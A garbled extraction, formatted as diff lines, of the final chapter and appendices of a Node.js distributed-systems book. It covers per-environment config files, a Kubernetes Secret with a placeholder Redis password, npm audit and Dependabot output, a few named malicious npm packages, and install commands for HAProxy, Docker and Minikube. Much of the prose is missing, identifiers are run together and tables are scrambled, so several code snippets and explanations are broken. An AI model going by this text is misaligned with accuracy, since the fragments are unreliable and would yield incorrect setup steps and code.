+$ touch config/{index,default,development,staging,production}.js
+
+Next, modify the config/default.js file and add the content from Example 10-4 to it.
+Example 10-4. configuration/config/default.js
+module.exports = {
+REDIS: process.env.REDIS, WIDGETS_PER_BATCH: 2,
+MAX_WIDGET_PAYLOAD: Number(process.env.PAYLOAD) || 1024 * 1024
+};
+
+REDIS REDIS WIDGETS_PER_BATCH
+
+MAX_WIDGET_PAYLOAD PAYLOAD Next, modify the config/development.js file, adding the content from Example 10-5.
+Example 10-5. configuration/config/development.js
+module.exports = { ENV: 'development',
+REDIS: process.env.REDIS || 'redis://localhost:6379', MAX_WIDGET_PAYLOAD: Infinity
+};
+
+ENV CONFIG.ENV process.env.NODE_ENVREDIS REDIS MAX_WIDGET_PAYLOADInfinityENV 
+WIDGETS_PER_BATCHNext, modify the config/index.js file to look like Example 10-6.
+Example 10-6. configuration/config/index.js
+const { join } = require('path'); const ENV = process.env.NODE_ENV;
+
+try {
+var env_config = require(join(  dirname, `${ENV}.js`));
+} catch (e) {
+console.error(`Invalid environment: "${ENV}"!`); console.error(`Usage: NODE_ENV=<ENV> node app.js`); process.exit(1);
+}
+const def_config = require(join(  dirname, 'default.js'));
+
+module.exports = Object.assign({}, def_config, env_config); 
+const Redis = require('ioredis');
+const CONFIG = require('./config/index.js');
+
+const redis = new Redis(CONFIG.REDIS);
+
+Secrets Management
+apiVersion: v1 kind: Secret metadata:
+name: redisprod type: Opaque stringData:
+redisconn: "redis://admin:hunter2@192.168.2.1"
+
+
+spec.template.spec.containers env:
+- name: REDIS valueFrom:
+secretKeyRef: name: redisprod key: redisconn
+
+REDIS Upgrading Dependencies
+
+
+ Automatic Upgrades with GitHub Dependabot
+Figure 10-1. The dreaded GitHub dependency vulnerability
+ ll request
+@dependabot rebase 
+Manual Upgrades with npm CLI
+$ mkdir audit && cd audit
+$ npm init -y
+$ npm install js-yaml@3.9.1 hoek@4.2.0
+
+npm install added 5 packages from 8 contributors and audited 5 packages in 0.206s found 3 vulnerabilities (2 moderate, 1 high)
+run `npm audit fix` to fix them, or `npm audit` for details
+
+$ npm outdated
+
+Table 10-2. Example npm outdated output
+Package Current Wanted Latest Location
+
+hoek	4.2.0	4.2.1	6.1.3	audit
+
+npm audit  $ rm -rf node_modules
+$ npm install
+
+$ npm audit
+
+Table 10-3. Example npm audit output
+
+Level	Type	Package
+
+Dependency
+of	Path	More info
+
+
+
+
+Moderate Denial of	js-yaml	js-yaml	js-	https://npmjs.com/advisories/788
+
+Service	yaml
+
+Moderate Prototype
+Pollution
+
+hoek	hoek	hoek	https://npmjs.com/advisories/566
+
+js-yaml hoek js-yamlhoek $ npm update js-yaml --depth 1
+
+js-yaml@^3.9.1 js-yaml@^3.14.0npm audit 
+4.2.1.hoek npm audit Run the following command to manually fix the vulnerable package:
+$ npm update hoek
+
+hoek@^4.2.0 hoek@^4.2.1npm audit npm audit $ npm audit --audit-level=high --only=prod ; echo $?
+
+Unpatched Vulnerabilities
+
+git diff --patchfoo.run(user_input) 
+a[0][999999999]=1POST Upgrading Node.js
+http 
+Node.js LTS Schedule
+
+Figure 10-3. Node.js LTS release schedule5
+Upgrade Approach
+
+
+
+Some of the dozens of known malicious packages include getcookies, crossenv, mongose, and
+babelcli.
+1	Technically, your shell is probably writing every command you run to a history file, but production process launchers won’t have this problem.
+2This database originated from the Node Security Project and is managed by npm since acquiring
+^Lift.
+3	GitHub acquired npm relatively recently as of the writing of this book. Both npm audit and Dependabot existed before the acquisition, and I expect the two products to evolve and merge in the coming years.
+4Image courtesy of Colin Ihrig under Apache License 2.0.
+5If you ever spot this happening, I encourage you to step in and spearhead the upgrade process.
+
+Appendix A. Installing HAProxy
+
+
+haproxy sudo apt install haproxyhaproxy -v Linux: Build from Source
+man $ sudo apt install libssl-dev # Debian / Ubuntu
+$ curl -O http://www.haproxy.org/download/2.1/src/haproxy-2.1.8.tar.gz
+$ tar -xf haproxy-2.1.8.tar.gz
+$ cd haproxy-2.1.8
+$ make -j4 TARGET=linux-glibc USE_ZLIB=yes USE_OPENSSL=yes
+$ sudo make install
+
+Linux: Install Precompiled Binary
+
+$ curl -O https://thomashunter.name/pkg/haproxy-2.1.8-linux.tar.gz
+$ tar -xf haproxy-2.1.8-linux.tar.gz
+$ ./haproxy -v # test
+$ sudo mv ./haproxy /usr/bin/haproxy
+$ sudo chown root:root /usr/bin/haproxy
+
+
+macOS: Install via Homebrew
+$ brew install haproxy@2.1.8
+$ haproxy -v # test
+
+Appendix B. Installing Docker
+
+
+macOS: Install Docker Desktop for Mac
+Linux: Convenient Install Script
+$ curl -fsSL https://get.docker.com -o get-docker.sh
+$ sudo sh get-docker.sh
+
+
+sudo docker $ sudo usermod -aG docker $USER
+$ su - $USER
+
+docker-compose $ sudo curl -L "https://github.com/docker/compose/releases/download\
+/1.26.2/docker-compose-$(uname -s)-$(uname -m)" \
+-o /usr/local/bin/docker-compose
+$ sudo chmod +x /usr/local/bin/docker-compose
+
+Appendix C. Installing Minikube & Kubectl
+
+
+Linux: Debian Package and Precompiled Binary
+$ curl -LO https://storage.googleapis.com/minikube/releases\
+/latest/minikube_1.9.1-0_amd64.deb
+$ sudo dpkg -i minikube_1.9.1-0_amd64.deb
+$ curl -LO https://storage.googleapis.com/kubernetes-release\
+/release/v1.18.2/bin/linux/amd64/kubectl
+$ chmod +x ./kubectl
+$ sudo mv kubectl /usr/bin/
+
+
+macOS: Install via Homebrew
+
+$ brew install minikube
+
+Index
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+About the Author
+
+Colophon
+The animal on the cover of Distributed Systems with Node.js is an antlion (Myrmeleontidae). Antlion species can be found all over the world but most are found in dry and sandy habitats nearer the tropics.
